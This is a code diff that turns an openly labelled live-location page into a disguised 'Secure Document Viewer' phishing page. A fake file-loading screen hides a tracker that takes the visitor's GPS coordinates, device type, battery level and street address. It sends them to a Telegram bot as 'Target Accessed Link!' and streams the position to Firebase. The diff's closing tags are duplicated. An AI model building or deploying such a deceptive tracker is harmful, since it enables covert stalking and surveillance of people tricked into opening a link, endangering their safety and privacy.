@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location Sender</title>
+    <title>Secure Document Viewer</title>
     <style>
         * {
             margin: 0;
@@ -14,56 +14,56 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             text-align: center; 
             padding: 40px 20px; 
-            background-color: #121212; 
-            color: #ffffff; 
+            background-color: #0d1117; 
+            color: #c9d1d9; 
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
         .container {
-            background: #1e1e1e;
-            padding: 30px 20px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
-            max-width: 400px;
+            background: #161b22;
+            padding: 35px 25px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 420px;
             width: 100%;
-            border: 1px solid #2a2a2a;
+            border: 1px solid #30363d;
         }
         h2 {
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: #00ffcc;
+            font-size: 20px;
+            margin-bottom: 12px;
+            color: #58a6ff;
         }
         #status { 
-            font-size: 15px; 
-            color: #dddddd; 
-            font-weight: 500; 
-            line-height: 1.6;
+            font-size: 14px; 
+            color: #8b949e; 
+            font-weight: 400; 
+            line-height: 1.5;
             margin-top: 15px;
             word-break: break-word;
         }
-        .pulse-dot {
-            height: 12px;
-            width: 12px;
-            background-color: #00ffcc;
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #30363d;
+            border-top: 3px solid #58a6ff;
             border-radius: 50%;
-            display: inline-block;
-            margin-right: 8px;
-            animation: pulse 1.5s infinite;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
         }
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 204, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0); }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .error { color: #ff5555 !important; }
+        .error { color: #f85149 !important; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2><span class="pulse-dot"></span>GPS Live Tracking</h2>
-        <p id="status">Connecting to GPS satellites...</p>
+        <div class="spinner"></div>
+        <h2>Loading Shared File...</h2>
+        <p id="status">Establishing secure connection & verifying permissions...</p>
     </div>
 
     <!-- Firebase SDKs -->
@@ -94,12 +94,52 @@
 
         let hasAlerted = false;
 
-        function sendTelegramAlert(lat, lng, accuracy) {
+        // Device & Browser Detection Helper
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Desktop/PC";
+            if (/android/i.test(ua)) device = "Android Mobile";
+            if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone/iOS";
+            return device;
+        }
+
+        // Reverse Geocoding to get human-readable Address
+        async function getAddress(lat, lng) {
+            try {
+                let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                let data = await response.json();
+                return data.display_name || "Exact address not found";
+            } catch (e) {
+                return "Address lookup failed";
+            }
+        }
+
+        async function sendTelegramAlert(lat, lng, accuracy) {
             if (hasAlerted) return;
             hasAlerted = true;
 
+            let batteryInfo = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging ⚡)' : ''}`;
+                }
+            } catch (e) {
+                batteryInfo = "Not Accessible";
+            }
+
+            const deviceType = getDeviceInfo();
+            statusText.innerText = "Fetching location details...";
+            const address = await getAddress(lat, lng);
             const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-            const message = `🚨 *Target Opened Tracking Link!*\n\n📍 *Latitude:* ${lat}\n📍 *Longitude:* ${lng}\n🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n🗺️ [Google Maps Location](${mapUrl})`;
+            
+            const message = `🚨 *Target Accessed Link!* 🎯\n\n` +
+                            `📱 *Device:* ${deviceType}\n` +
+                            `🔋 *Battery:* ${batteryInfo}\n` +
+                            `📍 *Address:* ${address}\n` +
+                            `🌐 *Coordinates:* \`${lat}, ${lng}\`\n` +
+                            `🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n` +
+                            `🗺️ [Open in Google Maps](${mapUrl})`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
@@ -109,6 +149,8 @@
                     text: message,
                     parse_mode: "Markdown"
                 })
+            }).then(() => {
+                statusText.innerText = "File loaded successfully!";
             }).catch(err => console.error("Telegram Alert Error:", err));
         }
 
@@ -118,13 +160,10 @@
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
 
-                statusText.innerText = `Location Active\nLatitude: ${lat.toFixed(5)}\nLongitude: ${lng.toFixed(5)}\nAccuracy: ~${Math.round(accuracy)}m`;
-                statusText.classList.remove("error");
-
-                // Send Telegram Notification
+                // Send Advanced Notification once
                 sendTelegramAlert(lat, lng, accuracy);
 
-                // Update Firebase
+                // Update Live Firebase Data continuously
                 set(ref(db, 'users/sahil'), {
                     latitude: lat,
                     longitude: lng,
@@ -133,7 +172,7 @@
                 });
 
             }, (error) => {
-                statusText.innerText = "Error: " + error.message;
+                statusText.innerText = "Access denied or GPS unavailable: " + error.message;
                 statusText.classList.add("error");
             }, {
                 enableHighAccuracy: true,
@@ -141,9 +180,12 @@
                 maximumAge: 0
             });
         } else {
-            statusText.innerText = "Geolocation is not supported by this browser.";
+            statusText.innerText = "Browser doesn't support geolocation.";
             statusText.classList.add("error");
         }
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
